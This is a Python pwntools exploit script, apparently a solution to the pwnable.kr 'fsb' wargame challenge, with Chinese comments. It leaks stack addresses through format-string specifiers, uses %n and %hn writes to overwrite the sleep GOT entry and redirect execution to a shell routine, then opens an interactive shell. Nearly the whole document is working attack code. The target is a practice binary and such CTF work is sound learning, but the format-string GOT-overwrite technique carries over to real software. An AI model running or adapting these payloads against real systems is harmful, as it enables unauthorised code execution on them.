#coding:utf-8
#能不能跑看运气啊.....
from pwn import *
# p = ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')
p=process("./fsb")


raw_input("1....")
payload = "%14$08x%18$08x"
p.recvuntil('(1)\n')
p.sendline(payload)
esp = int(p.recv(8),16) - 0x50
ebp = int(p.recv(8),16)
offset = (ebp - esp) / 4
log.success("esp = " + hex(esp))
log.success("ebp = " + hex(ebp))
log.success("offset = " + str(offset))



raw_input("2....")
#print payload
payload="%134520840c%18$n"

sleep_got = 0x0804a008
payload2 = "%%%dc"%(sleep_got) + "%18$n"

if payload2 == payload:
    print "yesss"
else:
    print "noo"
# print payload
p.recvuntil('(2)\n')
p.sendline(payload2)



raw_input("3...")
payload="%34475c%"+str(offset)+"$hn"
shell     = 0x080486ab
payload2 = ("%%%dc"%(shell&0xffff)) + "%%%d$hn"%(offset)
if payload==payload2:
    print "yes"
else:
    print "nooooooooo"
# print p.recvuntil('(3)\n')
print payload
#p.recvuntil('(3)\n')
sleep(3)
p.sendline(payload2)


raw_input("4 ....")
p.recvuntil('(4)\n')
# print "done ........." #无语,这里加一行就出不了shell
p.sendline("AAAAAAAA")


raw_input("#####################x########################")
sleep(4)
p.interactive()
